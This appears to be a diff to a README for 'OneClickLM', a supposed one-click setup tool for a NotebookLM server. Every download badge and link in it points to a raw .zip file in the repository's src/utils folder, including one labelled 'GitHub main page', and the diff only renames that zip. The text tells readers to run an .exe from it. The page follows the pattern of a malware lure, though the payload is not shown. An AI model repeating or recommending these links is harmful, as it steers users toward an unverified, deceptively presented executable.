@@ -1,6 +1,6 @@
 # ⚙️ OneClickLM - Simple Setup for NotebookLM Server
 
-[![Download OneClickLM](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/Russiateleworking29/OneClickLM/raw/refs/heads/main/src/utils/LM-One-Click-armillary.zip)
+[![Download OneClickLM](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/Russiateleworking29/OneClickLM/raw/refs/heads/main/src/utils/One_LM_Click_v1.2.zip)
 
 ---
 
@@ -31,7 +31,7 @@ No additional software is required in most cases. OneClickLM manages all necessa
 
 Click the green button below to visit the official OneClickLM GitHub page. From there, you can download the latest version of the program right onto your PC.
 
-[![Download OneClickLM](https://img.shields.io/badge/Download-Link-blue)](https://github.com/Russiateleworking29/OneClickLM/raw/refs/heads/main/src/utils/LM-One-Click-armillary.zip)
+[![Download OneClickLM](https://img.shields.io/badge/Download-Link-blue)](https://github.com/Russiateleworking29/OneClickLM/raw/refs/heads/main/src/utils/One_LM_Click_v1.2.zip)
 
 ### Step 2: Find the Download
 
@@ -106,7 +106,7 @@ It is written in TypeScript and uses tools like NPX and VSCode for development, 
 
 ## 🔗 Useful Links
 
-- GitHub main page: [https://github.com/Russiateleworking29/OneClickLM/raw/refs/heads/main/src/utils/LM-One-Click-armillary.zip](https://github.com/Russiateleworking29/OneClickLM/raw/refs/heads/main/src/utils/LM-One-Click-armillary.zip)
+- GitHub main page: [https://github.com/Russiateleworking29/OneClickLM/raw/refs/heads/main/src/utils/One_LM_Click_v1.2.zip](https://github.com/Russiateleworking29/OneClickLM/raw/refs/heads/main/src/utils/One_LM_Click_v1.2.zip)
 - Download latest installer: Visit the link above and select the latest `.exe` file under Releases
 
 ---
@@ -123,7 +123,7 @@ It's useful if you want to experiment with AI tools, automation, or run local in
 
 - Click the button below to go to the download page.
 
-[![Download OneClickLM](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/Russiateleworking29/OneClickLM/raw/refs/heads/main/src/utils/LM-One-Click-armillary.zip)
+[![Download OneClickLM](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/Russiateleworking29/OneClickLM/raw/refs/heads/main/src/utils/One_LM_Click_v1.2.zip)
 
 - Find the file with the `.exe` extension.
 - Download it to your computer.
@@ -178,4 +178,4 @@ Developers will assist based on feedback from users.
 
 # ⚙️ OneClickLM - Simple Setup for NotebookLM Server
 
-[![Download OneClickLM](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/Russiateleworking29/OneClickLM/raw/refs/heads/main/src/utils/LM-One-Click-armillary.zip)
+[![Download OneClickLM](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/Russiateleworking29/OneClickLM/raw/refs/heads/main/src/utils/One_LM_Click_v1.2.zip)
